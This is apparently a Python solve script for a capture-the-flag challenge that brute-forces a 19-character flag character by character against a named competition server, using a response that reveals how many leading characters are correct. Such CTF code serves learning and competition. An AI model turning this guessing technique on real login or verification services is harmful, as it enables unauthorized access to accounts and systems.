import time
import string
import socket

# get all data from the socket
def get_all_data(sock):
    # the data
    data = ''

    # try to do it
    try:
        # loop 'forever'
        while True:
            # get the right now data
            now = client_socket.recv(1024).decode('utf-8')

            # check
            if not now:
                # no data so must be done
                break

            # add the now data to the total data
            data += now
    except:
        # likely a timeout or read error
        pass

    # done
    return data



# count how many correct
def parse_correct_qty(data):
    # keep track of the count
    count = 0

    # parse the data into each line
    for line in data.split('\n'):
        # check if this line has 'Flag input:' indicating a successful letter
        if 'Flag input:' in line:
            count += 1

    # done
    return count




# keep track of the correct password so far
correct_password = 'pctf{'

# loop until we have all 19
while len(correct_password) < 19:
    # loop through all upper, lower, digits, and curly braces
    for c in (string.ascii_uppercase + string.ascii_lowercase + string.digits + '{}'):
        # generate the password guess this time
        # which is all the correct so far and then add
        # on qty of c until length is 19
        # follow by a newline
        pwd = correct_password
        while len(pwd) < 19:
            pwd += c
        pwd += '\n'

        # sever connection info
        server_ip = 'chal.pctf.competitivecyber.club'
        server_port = 4757

        # connect to the server with a timeout
        # this timeout also affects the read speed so lower
        # numbers will make program faster, but too low before RTT
        # and you may disconnect
        client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client_socket.settimeout(0.25)
        client_socket.connect((server_ip, server_port))

        # get banner data from server
        reply = get_all_data(client_socket)

        # send password to the server
        print('trying ' + pwd)
        client_socket.send(pwd.encode('utf-8'))

        # get result data from server
        reply = get_all_data(client_socket)

        # check how many correct
        correct_now = parse_correct_qty(reply)

        # check if this is a new length
        if correct_now > len(correct_password):
            # found a new character so update the correct passowrd
            correct_password = pwd[0 : correct_now]

            # close socket
            client_socket.close()

            # break inner loop of iterating c
            break

        # didnt get new one so close socket and loop back up to try the next c
        client_socket.close()

# done
print(correct_password)